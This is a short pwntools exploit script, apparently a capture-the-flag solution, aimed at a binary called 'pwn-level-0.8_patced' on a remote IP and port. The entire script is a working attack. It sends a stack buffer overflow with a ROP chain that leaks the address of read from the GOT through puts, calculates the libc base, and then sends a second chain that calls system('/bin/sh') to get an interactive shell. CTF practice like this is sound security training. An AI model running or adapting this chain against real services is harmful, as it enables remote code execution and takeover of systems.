from pwn import *

exe = './pwn-level-0.8_patced'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'DEBUG'
# sh = process(exe)
sh = remote('103.167.132.234', 27428)
library = './libc.so.6' # Change this to the actual libc used by the binary
libc = context.binary = ELF(library, checksec=False)
padding = 328

rop = ROP(elf)

# Find gadgets dynamically
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
mov_rdi_rsi = 0x401205
ret = 0x401016

info(f'pop rsi --> {hex(pop_rsi)}')
info(f'mov rdi, rsi --> {hex(mov_rdi_rsi)}')
info(f'ret --> {hex(ret)}')

# Build ROP chain
p = flat([
    b'A' * padding,
    ret,
    pop_rsi,
    elf.got['read'],
    mov_rdi_rsi,
    elf.plt['puts'],
    # Padding to align the stack
    elf.sym['scream']
])
sh.sendline(b'3')
sh.sendlineafter(b'screamed: ', p)
sh.recvline()
sh.recvline()

# Extract leaked address
get = sh.recvline().strip()
leaked = unpack(get.ljust(8, b'\x00'))
success(f'LEAKED --> {hex(leaked)}')

libc.address = leaked - libc.sym['read']
success(f'LIBC BASE --> {hex(libc.address)}')

p = flat([
    asm('nop') * padding,
    ret,
    pop_rsi,
    next(libc.search(b'/bin/sh\x00')),
    mov_rdi_rsi,
    ret,
    libc.sym['system']
])

sh.sendlineafter(b'screamed: ', p)
sh.interactive()
